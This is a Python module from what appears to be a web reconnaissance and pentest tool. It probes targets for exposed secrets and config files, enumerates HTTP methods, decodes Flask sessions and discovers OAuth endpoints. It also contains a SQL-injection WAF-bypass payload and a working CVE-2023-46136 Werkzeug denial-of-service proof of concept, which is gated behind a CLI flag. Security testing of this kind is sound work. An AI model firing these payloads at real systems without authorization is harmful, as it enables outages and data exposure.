"""
ingotus/core/http.py

HTTP banner grabbing, tech-stack detection, sensitive-path probing,
server-version extraction via error pages, HTTP method enumeration,
cookie security flag analysis, Flask session decode, OAuth endpoint
discovery, and CVE-2023-46136 (Werkzeug DoS) automated PoC.
"""

import base64
import json
import re
import time
import zlib
from typing import Any, Dict, List, Optional

import requests
import urllib3

from core.api_discovery import probe_graphql_introspection, probe_swagger_endpoints
from core.cache import http_cache
from core.config import (
    API_CONTENT_TYPES,
    DANGEROUS_HTTP_METHODS,
    PROBE_TIMEOUT,
    RESPONSE_SNIPPET_SIZE,
    TIMEOUT,
    USER_AGENT,
)
from core.fingerprint import fingerprint_engine
from core.js_scraper import analyze_js_file, extract_js_urls
from core.logger import log_info, log_success, log_warning
from core.models import HTTPInfo

# Suppress SSL warnings for self-signed / invalid certs during recon
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Regex for server version in error-page bodies ────────────────────────────
_SERVER_VERSION_RE = re.compile(
    r"\b(nginx|apache|openresty|lighttpd|microsoft-iis|tomcat|jetty)[/\s]*([\d]+\.[\d]+[\d.]*)\b",
    re.IGNORECASE,
)


# ── Content validation ────────────────────────────────────────────────────────

def is_valid_sensitive_content(path: str, content: str) -> bool:
    """
    Validates if the HTTP 200 response content is a genuine file exposure
    rather than a generic HTML error page, SPA routing page, or WAF block page.
    """
    if not content:
        return False

    lower_content = content.lower()
    is_html = any(tag in lower_content for tag in ("<html", "<!doctype", "<body", "<head"))

    # Actuator, Apache server-status, DS_Store, and raw configs MUST NOT be HTML
    if any(p in path.lower() for p in ("actuator", "server-status", "server-info", ".ds_store", ".env", ".git", ".sql", ".json", ".htpasswd", "config")):
        if is_html:
            return False

    if "actuator/env" in path.lower():
        return "activeprofiles" in lower_content or "propertySources" in content or "systemProperties" in content

    if "actuator/health" in path.lower():
        return '"status":"up"' in lower_content or '"status":"down"' in lower_content

    if "actuator/mappings" in path.lower():
        return "contexts" in lower_content and "dispatcherServlets" in lower_content

    if "server-status" in path.lower():
        return "apache server status" in lower_content or "server uptime" in lower_content or "requests currently being processed" in lower_content

    if "server-info" in path.lower():
        return "apache server information" in lower_content or "server settings" in lower_content

    if ".ds_store" in path.lower():
        return not is_html and (content.startswith("\x00\x00\x00\x01") or "Bud1" in content or len(content) > 10)

    if ".git/HEAD" in path:
        return bool(re.search(r"^(ref: refs/|[a-f0-9]{40})", content.strip()))

    if ".env" in path:
        return bool(re.search(r"^[A-Za-z0-9_]+\s*=", content, re.MULTILINE))

    if "config.php" in path or "wp-config.php" in path:
        return "<?php" in content or "define(" in lower_content or "db_password" in lower_content

    if ".git/config" in path:
        return "[core]" in lower_content or "[remote" in lower_content

    if ".htpasswd" in path:
        return bool(re.search(r"^[a-zA-Z0-9_-]+:[a-zA-Z0-9_\.\$/]+", content.strip()))

    if ".sql" in path or "backup" in path:
        sql_keywords = ["create table", "insert into", "select ", "database"]
        if "-- mysql dump" in lower_content or "-- phpmyadmin" in lower_content or "postgresql database dump" in lower_content:
            return True
        return any(kw in lower_content for kw in sql_keywords)

    if "settings.json" in path or ".json" in path:
        stripped = content.strip()
        return (stripped.startswith("{") and stripped.endswith("}")) or (stripped.startswith("[") and stripped.endswith("]"))

    if "phpinfo.php" in path:
        return "phpversion()" in lower_content or "php version" in lower_content or "virtual directory support" in lower_content

    if "robots.txt" in path:
        return "user-agent:" in lower_content or "disallow:" in lower_content

    # If response is generic HTML, it is a Soft-404 SPA fallback
    if is_html:
        return False

    return True


# ── Origin bypass probe ───────────────────────────────────────────────────────

def probe_origin_bypass(
    ip: str,
    hostname: str,
    proxy: Optional[str] = None,
    cdn_status: Optional[int] = None,
    protected: bool = False,
) -> tuple[bool, Optional[int], Optional[str], bool, str]:
    """
    Tests if the origin IP responds directly with the Host header set to the
    real hostname, confirming that the WAF/CDN can be bypassed.

    Diff Engine:
    Compares the CDN response (e.g. 403 WAF block) with the direct origin response (200 OK),
    generating an irrefutable proof string of WAF bypass.

    Returns:
        (confirmed, status_code, response_snippet, exposes_stacktrace, diff_proof_note)
    """
    headers = {
        "User-Agent": USER_AGENT,
        "Host":       hostname,
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None

    # Test payload for differential WAF check
    payload_path = "/?id=1'%20OR%20'1'='1"

    for proto in ("https", "http"):
        url = f"{proto}://{ip}"
        try:
            r = requests.get(
                url,
                headers=headers,
                timeout=PROBE_TIMEOUT,
                verify=False,
                allow_redirects=False,
                proxies=proxies,
            )
            snippet = r.text[:RESPONSE_SNIPPET_SIZE] if r.text else ""
            has_stacktrace = any(kw in snippet.lower() for kw in (
                "traceback (most recent call last)",
                "werkzeug debugger",
                "django display-textbox",
                "laravel",
                "exception at /",
                "line in ",
            ))

            diff_note = ""
            # Perform active differential WAF test if CDN blocked the main request
            if cdn_status in (403, 406, 429, 502, 503):
                try:
                    r_payload = requests.get(
                        f"{url}{payload_path}",
                        headers=headers,
                        timeout=PROBE_TIMEOUT,
                        verify=False,
                        allow_redirects=False,
                        proxies=proxies,
                    )
                    if r_payload.status_code in (200, 301, 302, 404, 500) and r_payload.status_code not in (403, 406):
                        diff_note = f"[WAF BYPASS PROOF] CDN Status: HTTP {cdn_status} (Proteção Ativa) vs IP Direto ({ip}): HTTP {r_payload.status_code} (Payload aceito sem bloqueio de WAF!)"
                except Exception:
                    pass

            # A protected hostname requires a differential proof.  An edge
            # returning the same HTTP 200 as the public hostname is not an
            # origin bypass.  For an unprotected hostname, a direct 200 is a
            # valid origin exposure observation.
            is_valid_bypass = (
                bool(diff_note) or has_stacktrace
                if protected
                else r.status_code == 200 or has_stacktrace
            )

            if is_valid_bypass:
                return True, r.status_code, snippet, has_stacktrace, diff_note
            return False, r.status_code, snippet, has_stacktrace, diff_note
        except requests.exceptions.RequestException:
            continue

    return False, None, None, False, ""


# ── Server version via error page ─────────────────────────────────────────────

def probe_server_version(
    host: str,
    proto: str,
    headers: dict,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
) -> Optional[str]:
    """
    Attempt to extract server version from 404/400 error page body when the
    Server header does not include a version string (e.g. 'Server: nginx').
    Returns 'product/version' string or None.
    """
    probe_paths = [
        "/ingotus-probe-8f3k2z",   # guaranteed 404
        "/INGOTUS_VERSION_PROBE",
    ]
    for path in probe_paths:
        try:
            r = requests.get(
                f"{proto}://{host}{path}",
                headers=headers,
                cookies=cookies or {},
                timeout=PROBE_TIMEOUT,
                verify=False,
                allow_redirects=False,
                proxies=proxies,
            )
            m = _SERVER_VERSION_RE.search(r.text)
            if m:
                return f"{m.group(1).lower()}/{m.group(2)}"
        except Exception:
            pass
    return None


# ── HTTP method enumeration ───────────────────────────────────────────────────

def probe_http_methods(
    base_url: str,
    req_headers: dict,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
) -> List[str]:
    """
    Probe for dangerous HTTP methods by sending an OPTIONS request and then
    individually testing TRACE, PUT, DELETE.

    Returns a list of confirmed dangerous methods (empty = none found).
    """
    dangerous_found: List[str] = []

    # Step 1: OPTIONS — get the Allow header
    try:
        r = requests.options(
            base_url,
            headers=req_headers,
            cookies=cookies or {},
            timeout=PROBE_TIMEOUT,
            verify=False,
            allow_redirects=False,
            proxies=proxies,
        )
        allow_header = r.headers.get("allow", "") + r.headers.get("Allow", "")
        for method in DANGEROUS_HTTP_METHODS:
            if method in allow_header.upper():
                dangerous_found.append(method)
    except Exception:
        pass

    # Step 2: Directly test TRACE (some servers don't advertise it in Allow)
    if "TRACE" not in dangerous_found:
        try:
            r = requests.request(
                "TRACE",
                base_url,
                headers=req_headers,
                cookies=cookies or {},
                timeout=PROBE_TIMEOUT,
                verify=False,
                allow_redirects=False,
                proxies=proxies,
            )
            # TRACE success: 200 with body echoing the request
            if r.status_code == 200 and "trace" in r.text.lower():
                dangerous_found.append("TRACE")
        except Exception:
            pass

    return list(set(dangerous_found))


# ── Flask session decode ──────────────────────────────────────────────────────

def probe_flask_session(response_headers: dict) -> Optional[Dict[str, Any]]:
    """
    Detects Flask session cookies in Set-Cookie headers and decodes their
    payload (base64 + optional zlib). The signature is NOT verified — we
    only read the public portion, which is never encrypted by default.

    Returns decoded dict or None if no Flask session present.
    """
    for key, val in response_headers.items():
        if key.lower() != "set-cookie":
            continue
        for cookie_str in val.split("\n"):
            cookie_str = cookie_str.strip()
            # Flask sessions start with a dot followed by base64
            value = cookie_str.split("=", 1)[1].split(";")[0].strip() if "=" in cookie_str else ""
            if not value.startswith("."):
                continue
            # Format: .payload.timestamp.signature  (dot-separated, URL-safe b64)
            parts = value.lstrip(".").split(".")
            if len(parts) < 2:
                continue
            payload_b64 = parts[0]
            # Add padding
            payload_b64 += "=" * (4 - len(payload_b64) % 4)
            try:
                raw = base64.urlsafe_b64decode(payload_b64)
                # Try zlib decompression (Flask compresses sessions > 500 bytes)
                try:
                    data = zlib.decompress(raw)
                except Exception:
                    data = raw
                return json.loads(data.decode("utf-8", errors="replace"))
            except Exception:
                continue
    return None


# ── OAuth endpoint discovery ──────────────────────────────────────────────────

_OAUTH_PATHS = [
    "/callback", "/oauth/callback", "/auth/callback",
    "/oauth2/callback", "/signin-oidc", "/auth",
    "/login", "/unlink", "/verify", "/disconnect",
    "/oauth", "/oauth2", "/sso", "/saml",
]

def probe_oauth_endpoints(
    base_url: str,
    req_headers: dict,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
) -> List[Dict[str, str]]:
    """
    Probes a list of common OAuth / auth callback paths.
    Records the status code and whether the response reveals an OAuth
    redirect (Location header pointing to an auth server).

    Returns list of dicts: {path, status, note}
    """
    log_info(f"[PROBE] Testando rotas OAuth/Auth em {base_url}...")
    found: List[Dict[str, str]] = []
    for path in _OAUTH_PATHS:
        url = f"{base_url}{path}"
        try:
            r = requests.get(
                url,
                headers=req_headers,
                cookies=cookies or {},
                timeout=PROBE_TIMEOUT,
                verify=False,
                allow_redirects=False,
                proxies=proxies,
            )
            status = r.status_code
            note = ""
            location = r.headers.get("location", "")
            if status in (301, 302, 303, 307, 308) and location:
                for kw in ("authorize", "oauth", "oidc", "sso", "login", "auth0", "okta", "microsoft", "google"):
                    if kw in location.lower():
                        note = f"OAuth redirect -> {location[:120]}"
                        break
            if status == 500:
                note = "Server error on callback — crashes on unauthenticated request"
            if status in (200, 302, 303, 307, 500) or note:
                log_success(f"[PROBE] Encontrado endpoint {path} (HTTP {status}) {note}")
                found.append({"path": path, "status": str(status), "note": note})
        except Exception:
            continue
    return found


# ── CVE-2023-46136 — Werkzeug multipart DoS PoC ───────────────────────────────

def probe_werkzeug_dos(
    base_url: str,
    req_headers: dict,
    post_paths: Optional[List[str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
) -> bool:
    """
    Sends a CVE-2023-46136 PoC (multipart boundary ending in '--') to
    candidate POST endpoints discovered on the target.

    A response time >= 8s or a Timeout exception before 30s is treated
    as confirmation that the server entered an infinite parsing loop.

    Returns True if DoS was confirmed on at least one endpoint.
    """
    if not post_paths:
        post_paths = ["/callback", "/oauth/callback", "/upload", "/api/upload", "/"]

    boundary = "X" * 70 + "--"
    body = (
        f"--{boundary}\r\n"
        f"Content-Disposition: form-data; name=\"f\"\r\n\r\n"
        + "A" * 200_000
    ).encode()
    headers = dict(req_headers)
    headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"

    for path in post_paths:
        url = f"{base_url}{path}"
        log_info(f"[EXPLOIT] Testando PoC CVE-2023-46136 em {url}...")
        t0 = time.time()
        try:
            r = requests.post(
                url,
                headers=headers,
                cookies=cookies or {},
                data=body,
                timeout=30,
                verify=False,
                allow_redirects=False,
                proxies=proxies,
            )
            elapsed = time.time() - t0
            if elapsed >= 8.0 or (r.status_code == 502 and elapsed >= 5.0):
                log_warning(f"[EXPLOIT] CVE-2023-46136 CONFIRMADO em {url} ({elapsed:.2f}s)!")
                return True
            log_info(f"[EXPLOIT] PoC em {url} finalizado sem DoS (HTTP {r.status_code}, {elapsed:.2f}s)")
        except requests.exceptions.Timeout:
            log_warning(f"[EXPLOIT] CVE-2023-46136 TIMEOUT CONFIRMADO em {url}!")
            return True
        except Exception as e:
            log_info(f"[EXPLOIT] Falha na requisição para {url}: {e}")
            continue
    return False


def _probe_werkzeug_dos_if_authorized(
    enabled: bool,
    base_url: str,
    req_headers: dict,
    crash_paths: List[str],
    cookies: Optional[Dict[str, str]] = None,
    proxies: Optional[Dict[str, str]] = None,
) -> bool:
    """Run the intrusive DoS validation only after explicit CLI authorization."""
    if not enabled or not crash_paths:
        return False
    return probe_werkzeug_dos(
        base_url,
        req_headers,
        post_paths=crash_paths,
        cookies=cookies,
        proxies=proxies,
    )


# ── Cookie security flag analysis ────────────────────────────────────────────

def analyze_cookies(response_headers: dict) -> List[str]:
    """
    Inspect Set-Cookie headers for missing security flags.
    Returns a deduplicated list of issue strings.

    Only reports issues when a cookie is actually set — never a false positive.
    Skips cookies that appear to be purely informational (e.g. analytics pixels
    whose name starts with _ga, _fbp, etc.).
    """
    # Collect all Set-Cookie values (requests lowercases header names)
    raw_cookies: List[str] = []
    for key, val in response_headers.items():
        if key.lower() == "set-cookie":
            # requests collapses multi-value headers with ', ' — split carefully
            raw_cookies.extend(v.strip() for v in val.split("\n") if v.strip())

    if not raw_cookies:
        return []

    issues: set = set()

    # Skip purely analytics / tracking cookies (low value, high noise)
    _SKIP_PREFIXES = ("_ga", "_gid", "_fbp", "_fbc", "_gcl", "OptanonConsent")

    for cookie_str in raw_cookies:
        # Cookie name is the part before the first '='
        cookie_name = cookie_str.split("=")[0].strip()
        if any(cookie_name.startswith(pfx) for pfx in _SKIP_PREFIXES):
            continue

        lower_str = cookie_str.lower()

        if "; secure" not in lower_str and lower_str.count("secure") == 0:
            issues.add("Cookie sem flag Secure")
        if "httponly" not in lower_str:
            issues.add("Cookie sem flag HttpOnly")
        if "samesite" not in lower_str:
            issues.add("Cookie sem atributo SameSite")

    return sorted(issues)


# ── Main HTTP info fetcher ────────────────────────────────────────────────────

def get_http_info(
    subdomain: str,
    proxy: Optional[str] = None,
    custom_port: Optional[int] = None,
    auth_cookies: Optional[Dict[str, str]] = None,
    auth_headers: Optional[Dict[str, str]] = None,
    enable_werkzeug_dos: bool = False,
) -> HTTPInfo:
    """
    Fetches HTTP information for a subdomain/host.
    Tries HTTPS first, falls back to HTTP. Supports custom port if specified.

    Extended with:
    - Server version extraction via error pages
    - HTTP method enumeration
    - Cookie security flag analysis
    - API endpoint detection (Content-Type: application/json)
    """
    base_cache_key = f"{subdomain}:{custom_port}" if custom_port else subdomain
    cache_key = f"{base_cache_key}|werkzeug_dos={int(enable_werkzeug_dos)}"
    cache_enabled = not auth_cookies and not auth_headers
    if cache_enabled:
        cached = http_cache.get(cache_key)
        if cached:
            return cached

    http_info = HTTPInfo()
    req_headers = {"User-Agent": USER_AGENT}
    if auth_headers:
        req_headers.update(auth_headers)
    proxies     = {"http": proxy, "https": proxy} if proxy else None

    successful_proto = None

    for proto in ("https", "http"):
        if custom_port:
            url = f"{proto}://{subdomain}:{custom_port}"
        else:
            url = f"{proto}://{subdomain}"
        try:
            response = requests.get(
                url,
                headers=req_headers,
                cookies=auth_cookies or {},
                timeout=TIMEOUT,
                verify=False,
                allow_redirects=True,
                proxies=proxies,
            )

            http_info.status    = response.status_code
            http_info.server    = response.headers.get("Server")
            http_info.powered_by = response.headers.get("X-Powered-By")
            successful_proto    = proto
            http_info.url       = response.url
            http_info.body      = response.text

            if response.history:
                http_info.redirects_to = response.url

            # Lowercased header keys for consistent lookup throughout the codebase
            http_info.headers = {k.lower(): v for k, v in response.headers.items()}

            # Body snippet — size controlled by config constant
            try:
                http_info.response_snippet = response.text[:RESPONSE_SNIPPET_SIZE]
            except Exception:
                http_info.response_snippet = ""

            # ── API endpoint detection ─────────────────────────────────────
            content_type = http_info.headers.get("content-type", "")
            http_info.is_api_endpoint = any(
                api_ct in content_type.lower() for api_ct in API_CONTENT_TYPES
            )

            # ── Tech stack detection ───────────────────────────────────────
            http_info.tech_stack = fingerprint_engine.detect_tech(
                http_info.headers,
                http_info.response_snippet,
            )

            # ── Cookie security analysis ───────────────────────────────────
            http_info.cookie_issues = analyze_cookies(http_info.headers)

            break  # Succeeded — do not try next protocol

        except requests.exceptions.RequestException:
            continue  # Try next protocol

    if not successful_proto or not http_info.status:
        if cache_enabled:
            http_cache.set(cache_key, http_info)
        return http_info

    base_url = (
        f"{successful_proto}://{subdomain}:{custom_port}"
        if custom_port
        else f"{successful_proto}://{subdomain}"
    )

    # ── Server version enrichment ──────────────────────────────────────────
    # When the Server header exists but has no version number, probe error pages.
    if http_info.server and not any(char.isdigit() for char in (http_info.server or "")):
        version_found = probe_server_version(
            subdomain,
            successful_proto,
            req_headers,
            cookies=auth_cookies,
            proxies=proxies,
        )
        if version_found:
            http_info.server = version_found

    # ── HTTP method enumeration ────────────────────────────────────────────
    http_info.http_methods = probe_http_methods(
        base_url,
        req_headers,
        cookies=auth_cookies,
        proxies=proxies,
    )

    # ── JS Secret & Route Scraper ──────────────────────────────────────────
    if http_info.status == 200 and http_info.response_snippet:
        js_urls = extract_js_urls(base_url, http_info.response_snippet)
        for js_url in js_urls:
            secrets, routes = analyze_js_file(js_url, proxy=proxy)
            if secrets:
                http_info.js_secrets.extend(secrets)
            if routes:
                http_info.js_routes.extend(routes)

        http_info.js_routes = list(set(http_info.js_routes))

    # ── API Discovery (Swagger / GraphQL) ──────────────────────────────────
    graphql_res = probe_graphql_introspection(
        base_url,
        proxy=proxy,
        auth_cookies=auth_cookies,
        auth_headers=auth_headers,
    )
    if graphql_res:
        http_info.api_endpoints.append(graphql_res)

    swagger_res = probe_swagger_endpoints(
        base_url,
        proxy=proxy,
        auth_cookies=auth_cookies,
        auth_headers=auth_headers,
    )
    if swagger_res:
        http_info.api_endpoints.extend(swagger_res)

    # ── Sensitive path probing ─────────────────────────────────────────────
    # Only HTTP 200 (actual content served) is recorded — redirects are NOT exposures.
    for path_obj in fingerprint_engine.sensitive_paths:
        path = path_obj["path"]
        probe_url = f"{successful_proto}://{subdomain}{path}"
        try:
            r = requests.get(
                probe_url,
                headers=req_headers,
                cookies=auth_cookies or {},
                timeout=PROBE_TIMEOUT,
                verify=False,
                allow_redirects=False,
                proxies=proxies,
            )
            if r.status_code == 200:
                if is_valid_sensitive_content(path, r.text):
                    http_info.sensitive_paths.append((path, r.status_code))
        except Exception:
            pass

    # ── Flask session decode ───────────────────────────────────────────────
    if http_info.headers:
        session_data = probe_flask_session(http_info.headers)
        if session_data:
            http_info.flask_session_data = session_data

    # ── OAuth endpoint discovery ───────────────────────────────────────────
    # Only probe when Werkzeug or a Python framework is detected (reduces noise)
    server_hdr = (http_info.server or "").lower()
    tech = " ".join(http_info.tech_stack).lower()
    if "werkzeug" in server_hdr or "flask" in tech or "python" in server_hdr:
        oauth_hits = probe_oauth_endpoints(
            base_url,
            req_headers,
            cookies=auth_cookies,
            proxies=proxies,
        )
        if oauth_hits:
            http_info.oauth_endpoints = oauth_hits
            # ── CVE-2023-46136 DoS PoC ────────────────────────────────────
            # Only triggered when /callback or similar is found returning 500
            crash_paths = [
                h["path"] for h in oauth_hits
                if h.get("status") == "500" or "/callback" in h["path"]
            ]
            http_info.werkzeug_dos_confirmed = _probe_werkzeug_dos_if_authorized(
                enable_werkzeug_dos,
                base_url,
                req_headers,
                crash_paths,
                cookies=auth_cookies,
                proxies=proxies,
            )

    if cache_enabled:
        http_cache.set(cache_key, http_info)
    return http_info
